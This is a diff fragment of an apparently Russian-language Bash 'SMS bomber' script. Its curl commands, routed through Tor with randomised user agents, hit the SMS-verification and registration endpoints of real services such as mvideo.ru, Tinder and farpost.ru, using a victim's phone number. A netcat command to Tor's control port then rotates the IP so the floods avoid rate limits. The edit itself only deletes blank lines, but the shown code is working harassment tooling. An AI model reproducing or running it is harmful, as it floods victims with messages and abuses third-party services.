@@ -58,7 +58,6 @@ S_BOMB(){ # Запускаем в фоне, демона ТОР тоже
         C_TOR "$3" "$4" # Чекаем ТОР
         GET_UA # Рандомный UserAgent
 #################################################################
-
 curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode?pageName=registerPrivateUserPhoneVerification' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "phone=${1:1:3}-${1:4:7}&g-recaptcha-response&recaptcha=on" -e 'https://www.mvideo.ru/register?sn=false' &>/dev/null & #mvideo.ru
 curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'http://lk.chulpan.ru/Portal/Selfcare/Register/' -H 'Content-Type: application/x-www-form-urlencoded' -d "redirect_type=&redirect_guid=&phone=%2B7+%28${1:1:3}%29+${1:4:3}-${1:7:4}&password=A$(shuf -i 234987-999999 -n 1)z" -e 'http://lk.chulpan.ru/Portal/Selfcare/LogIn' &>/dev/null & #lk.chulpan.ru
 curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://shop.vsk.ru/ajax/auth/postSms/' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "phone=+7+(${1:1:3})+${1:4:3}-${1:7:2}-${1:9:2}" -e 'https://shop.vsk.ru/personal/' &>/dev/null & #vsk.ru
@@ -79,7 +78,6 @@ curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://www.molb
 curl --socks5-hostname localhost:$3 -A "$UA" -b tmp -s "https://www.farpost.ru/sign/confirm?queryParameters%5Breturn%5D=%2F&sessionGeoId=0&return=%2F&sendStatus=notAllowed&sign=$1&entrance=&registration=ok&notsend=1" -H "GET /sign/confirm?queryParameters%5Breturn%5D=%2F&sessionGeoId=0&return=%2F&sendStatus=notAllowed&sign=$1&entrance=&registration=ok&notsend=1 HTTP/1.1" -e 'https://www.farpost.ru/sign?return=%2F' &>/dev/null & #farpost.ru
 curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' -H 'content-type: application/json' -d '{"phone_number":"'$1'"}' -e 'https://tinder.com/' &>/dev/null & #gotinder.com
 curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://agent.prostoy.ru/register/get_sms_code.php' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "<request><mobile>+${1::1}(${1:1:3})${1:4:3}-${1:7:2}-${1:9:2}</mobile></request>" -e 'https://www.prostoy.ru/register' &>/dev/null & #prostoy.ru
-
 #################################################################
         wait # Ожидаем завершения фоновых POST\GET запросов
         echo -e 'AUTHENTICATE "smsko_private"\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 $4 > /dev/null # Меняем ip ТОРа
